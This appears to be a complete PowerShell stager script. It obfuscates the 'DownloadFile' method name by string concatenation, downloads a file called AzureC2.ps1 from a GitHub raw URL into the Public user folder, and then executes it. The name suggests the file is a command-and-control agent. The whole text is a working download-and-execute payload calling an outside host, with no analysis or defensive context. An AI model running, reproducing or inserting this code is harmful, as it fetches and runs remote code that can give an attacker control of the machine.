$wss="Do"+"w"+"n"+"lo"+"ad"+"Fi"+"le"; 
$argsv1="https://raw.githubusercontent.com/bokanrb/bokanrb_git/master/Powershell/AzureC2.ps1"; 
$argsv2="C:\users\Public\AzureC2.ps1"; 
$wss2=New-Object Net.Webclient; 
IEX(($wss2).$wss.Invoke($argsv1,$argsv2)); 
& "C:\users\Public\AzureC2.ps1"
